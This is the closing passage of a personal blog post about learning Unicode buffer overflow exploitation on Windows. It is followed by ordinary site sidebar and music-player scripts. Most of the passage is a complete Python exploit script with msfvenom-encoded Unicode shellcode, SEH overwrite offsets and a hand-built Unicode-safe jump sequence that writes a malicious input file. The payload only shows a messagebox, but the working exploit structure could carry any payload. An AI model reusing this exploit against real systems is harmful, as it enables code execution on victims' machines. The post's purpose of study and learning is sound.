class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br><span class="hljs-keyword">import</span> argparse<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&#x27;--dos&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--poc&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--exploit&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>args = parser.parse_args()<br><br>OFFSET_NEXT = <span class="hljs-number">2282</span><br><br><span class="hljs-comment"># msfvenom -p windows/messagebox TEXT=&quot;hello&quot; -a x86 --platform windows -e x86/unicode_upper -f python -v shellcode BufferRegister=EAX</span><br>shellcode =  <span class="hljs-string">b&quot;&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x51\x41\x54\x41\x58\x41\x5a\x41\x50\x41&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x33\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x50\x41\x35\x41\x41\x41\x50\x41\x5a\x31&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31\x31&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x50\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x31&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x49\x41\x4a\x51\x49\x31\x41\x59\x41\x5a&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x42\x41\x42\x41\x42\x41\x42\x41\x42\x33\x30&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x41\x50\x42\x39\x34\x34\x4a\x42\x4b\x4c\x39&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x58\x34\x4f\x4d\x30\x4d\x30\x4b\x50\x43\x30&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x33\x59\x4b\x35\x30\x31\x4a\x32\x51\x54\x44&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x30\x52\x4e\x50\x44\x4b\x50\x52\x4c\x4c&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x44\x4b\x50\x52\x4e\x34\x4e\x51\x4b\x4f\x44&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x44\x32\x4d\x58\x4c\x4f\x37\x47\x30\x4a&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4d\x56\x4e\x51\x57\x50\x56\x4c\x4f\x4c\x43&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x31\x33\x4c\x4d\x32\x4e\x4c\x4f\x30\x49\x31&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x58\x4f\x4c\x4d\x4d\x31\x48\x47\x50\x49\x34&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x35\x4a\x4f\x32\x32\x54\x4b\x32\x32\x4c\x50&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x42\x37\x54\x4b\x4f\x52\x4f\x4c\x4d\x31\x4a&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x30\x34\x4b\x4f\x50\x34\x38\x45\x35\x57\x50&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x34\x34\x50\x4c\x4b\x51\x5a\x30\x34\x4b\x50&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x58\x4f\x30\x34\x4b\x51\x38\x4e\x38\x42\x30&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x51\x4a\x33\x43\x55\x57\x59\x33\x44\x4f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4c\x4f\x59\x44\x4b\x50\x34\x44\x4b\x50\x31&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x4f\x4b\x51\x38\x56\x50\x31\x37\x50\x56&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4c\x57\x51\x58\x4f\x4c\x4d\x4d\x31\x38\x47&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x30\x38\x49\x50\x44\x35\x4a\x54\x4c\x43\x33&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4d\x4b\x48\x4f\x4b\x53\x4d\x4d\x54\x53\x45&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x49\x50\x50\x58\x54\x4b\x52\x38\x4f\x34\x4d&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x31\x58\x53\x33\x36\x44\x4b\x4c\x4c\x30\x4b&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x54\x4b\x50\x58\x4d\x4c\x4d\x31\x5a\x33\x54&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x4c\x44\x34\x4b\x4d\x31\x48\x50\x53\x59&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x30\x44\x4f\x34\x4e\x44\x51\x4b\x31\x4b\x53&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x31\x30\x59\x31\x4a\x32\x31\x4b\x4f\x39\x50&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x30\x58\x51\x4f\x50\x5a\x44\x4b\x4e\x32\x4b&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x39\x53\x50\x4b\x4f\x4b\x4f\x4b\x4f\x31\x4d&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x59\x58\x4c\x4b\x4b\x50\x4d\x30\x4b\x50\x42&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x55\x43\x43\x53\x35\x32\x52\x4e\x53\x30\x32&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4e\x4e\x43\x34\x32\x4c\x32\x4c\x4d\x30\x33&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x38\x50\x4c\x33\x47\x4d\x56\x4b\x57\x4b\x4f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x39\x45\x52\x4a\x4b\x50\x5a\x48\x4c\x4b\x4d&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x30\x4b\x50\x4d\x30\x30\x4d\x53\x35\x53\x43&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x44\x33\x33\x31\x33\x37\x31\x55\x50\x42\x42&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4f\x43\x48\x4b\x50\x59\x58\x4d\x36\x4d\x30&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4d\x30\x4b\x50\x43\x38\x53\x35\x32\x4c\x52&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4c\x42\x4f\x4d\x30\x32\x4a\x4d\x30\x51\x58&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x50\x45\x34\x43\x31\x46\x4c\x47\x4b\x4f\x48&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x55\x42\x4a\x4b\x50\x43\x38\x4c\x30\x56\x55&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x35\x52\x31\x46\x4b\x4f\x39\x45\x41\x41&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_dos</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_poc</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_exploit</span>():<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>        OFFSET = <span class="hljs-number">118</span><br><br>        junk1 = OFFSET * <span class="hljs-string">b&#x27;A&#x27;</span><br>        junk2 = (OFFSET_NEXT - <span class="hljs-built_in">len</span>(junk1) - <span class="hljs-built_in">len</span>(shellcode)) * <span class="hljs-string">b&#x27;B&#x27;</span><br><br>        <span class="hljs-comment"># 0x0022EE0D</span><br>        <span class="hljs-comment"># ...</span><br>        <span class="hljs-comment"># ...</span><br><br>        <span class="hljs-comment"># [EAX] = 0x0022EAF8</span><br><br>        next_val = <span class="hljs-string">b&#x27;&#x27;</span><br>        next_val += <span class="hljs-string">b&#x27;\x61&#x27;</span> <span class="hljs-comment"># popad</span><br>        next_val += <span class="hljs-string">b&#x27;\x72&#x27;</span> <span class="hljs-comment"># add [edx], dh</span><br><br>        handler = <span class="hljs-string">b&#x27;\x60\x40&#x27;</span><br><br>        jumpcode = <span class="hljs-string">b&#x27;&#x27;</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x72&#x27;</span>         <span class="hljs-comment"># add [edx], dh</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x05\x15\x11&#x27;</span> <span class="hljs-comment"># add eax, 0x11001500</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x72&#x27;</span>         <span class="hljs-comment"># add [edx], dh</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x2d\x11\x11&#x27;</span> <span class="hljs-comment"># sub eax, 0x11001100</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x72&#x27;</span>         <span class="hljs-comment"># add [edx], dh</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x50&#x27;</span>         <span class="hljs-comment"># push eax</span><br>        jumpcode += <span class="hljs-string">b&#x27;\x72&#x27;</span>         <span class="hljs-comment"># add [edx], dh</span><br>        jumpcode += <span class="hljs-string">b&#x27;\xc3&#x27;</span>         <span class="hljs-comment"># ret</span><br><br>        buffer = junk1 + shellcode + junk2 + next_val + handler + jumpcode<br><br>        f.write(buffer)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> args.dos:<br>        do_dos()<br>    <span class="hljs-keyword">elif</span> args.poc:<br>        do_poc()<br>    <span class="hljs-keyword">elif</span> args.exploit:<br>        do_exploit()<br>    <span class="hljs-keyword">else</span>:<br>        parser.print_help()<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] File has been built&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>Now, let’s exploit the application again. The messagebox has been shown!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/18.png'><img src="/images/article/2026-9-15-Unicode-BoF/18.png" width=800/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This, time, I learned much more than I originally expected.</p>
+<p>At first, I though Unicode overflow was simply another type of buffer overflow technique. However, while working on the exploit, I realized that there were many details that were not explained clearly in my textbook. On top of that, some of the tools and environments mentioned in the book are already outdated, which caused me even more trouble during the process.</p>
+<p>I had to understand how Unicode conversion affects our payload, why the shellcode needs to follow a specific format, and how thoese NASM instructions are actually translated into opcodes.</p>
+<p>Only after understanding all of these details did I finally manage to make the exploit work.</p>
+<p>Honestly, this was much more difficult than I expected, but I also learned much more than I expected. Sometimes, understanding the details behind an exploit is much more important than simply following the “standard answer” from a textbook.</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p>I drew a <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/149655486">new drawing</a>!</p>
+<p align="center" class='item-img' data-src='/images/meme/Wallpaper/MyArt/5.png'><img src="/images/meme/Wallpaper/MyArt/5.png" width=700/>
+    <figcaption>
+    Good afternoonnnnnn!
+    </figcaption>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/13/2026-9-13-Kolibri-EggHunter/">[Learning] CVE-2014-4158: Kolibri Buffer Overflow with Egg Hunter Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unicode-Overflow"><span class="toc-number">2.</span> <span class="toc-text">Unicode Overflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Demonstration"><span class="toc-number">3.</span> <span class="toc-text">Demonstration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">5.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
